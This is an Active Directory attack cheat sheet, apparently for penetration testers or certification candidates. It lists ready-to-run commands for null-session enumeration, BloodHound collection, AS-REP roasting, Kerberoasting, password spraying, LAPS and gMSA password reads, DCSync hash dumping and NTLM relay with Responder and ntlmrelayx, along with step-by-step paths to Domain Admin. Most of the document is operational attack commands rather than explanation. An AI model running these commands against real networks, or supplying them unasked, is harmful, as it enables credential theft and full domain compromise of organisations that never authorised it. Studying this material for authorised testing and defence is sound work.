# Active Directory Battle Card

## What to Check First
```
1. DC PRESENT? → Ports 88 (Kerberos), 389 (LDAP), 445 (SMB), 53 (DNS)
2. USER ENUM → netexec smb target -u "" -p "" -M users
3. LDAP ANON → ldapsearch -H ldap://target -x -b "DC=domain,DC=local"
4. BLOODHOUND → bloodhound-python -d domain.local -u user -p pass -ns target -c all
```

## High-Value Findings
- **AS-REP roastable users** → Crackable TGT, no creds needed for check
- **Kerberoastable SPNs** → Service account hash, needs creds to request
- **SMB signing disabled** → NTLM relay → ADCS = DA
- **BloodHound path to DA** → Follow edge to Domain Admin
- **Unconstrained delegation** → Ticket theft on server compromise
- **Constrained delegation** → Protocol transition abuse → DA
- **DCSync rights** → Domain admin → Dump all hashes
- **AdminSDHolder modifiable** → DA persistence
- **LAPS readable** → Local admin passwords for all machines
- **GPP passwords** → Plaintext domain creds in SYSVOL
- **Password spray success** → First domain user → AD enumeration

## Immediate Commands
```
# NULL session reconnaissance (always first)
netexec smb target -u "" -p "" -M users
netexec ldap target -u "" -p "" -M users
enum4linux-ng -A target

# BloodHound
bloodhound-python -d domain.local -u user -p pass -ns target -c All
netexec ldap target -u user -p pass --bloodhound -c All

# Kerberos attacks
impacket-GetNPUsers domain.local/ -dc-ip target -request -format hashcat
impacket-GetUserSPNs -request domain.local/user:pass -dc-ip target

# Password spray
netexec smb target -u users.txt -p 'Password123' --continue-on-success
netexec winrm target -u users.txt -p 'Password123' --continue-on-success

# Check privileges
netexec smb target -u user -p pass --shares  # Share access
netexec smb target -u user -p pass --sessions # Active user sessions
findDelegation.py domain.local/user:pass -dc-ip target  # Check delegation
netexec ldap target -u user -p pass --gmsa    # gMSA passwords

# LAPS
netexec ldap target -u user -p pass -M laps

# DCSync (if DA)
impacket-secretsdump -just-dc domain.local/user:pass@target

# NTLM relay (if signing disabled)
sudo responder -I tun0 -wrf  # In one terminal
ntlmrelayx.py -tf targets.txt -smb2support  # In another
cme smb target -u '' -p '' -M respond  # Trigger
```

## Common Attack Paths
```
AS-REP ROAST → Crack → Domain User → Kerberoast → Service → Lateral
SMB SIGNING OFF → Relay → ADCS → DA → DCSync → All Hashes
PASSWORD SPRAY → Domain User → BloodHound → DA Path → DA
GPP PASSWORDS → Domain Creds → PSExec → SYSTEM → DA
LDAP ANON → Users → Spray → Domain User → AD Enum
KERBEROAST → Crack Service Hash → Lateral → DA Path
UNCONSTRAINED DELEGATION → Compromise Server → Ticket Capture → DA
LAPS READ → Local Admin → Host Admin → LSASS Dump → Domain Creds
```

## Escalation Paths
- **Domain User** → BloodHound → Shortest path to DA
- **Domain User** → Kerberoast → Service Account → Often domain admin on something
- **Local Admin on any machine** → LSASS dump → Domain user creds
- **SYSTEM on one host** → Credentials from cache → Lateral → DA
- **Write to GPO** → Deploy to all machines → Shell on DC
- **AdminCount attribute** → Identify high-value targets

## When to Stop
- Complete BloodHound ingest and analysis
- All common paths checked (AS-REP, Kerberoast, Spray, Relay)
- You've mapped your current position to DA path
- Move to enumeration/privesc if you need more access first

## Common Mistakes
- Not running BloodHound immediately with any available creds
- Only running one of AS-REP/Kerberoast/spray (you need all three)
- Not checking both SMB null session AND LDAP anonymous bind
- Forgetting to check delegation once you have domain user
- Not checking LAPS (often missed DA path)
- Only spraying one service (use SMB, WinRM, LDAP)
- Not using `--continue-on-success` in password spray
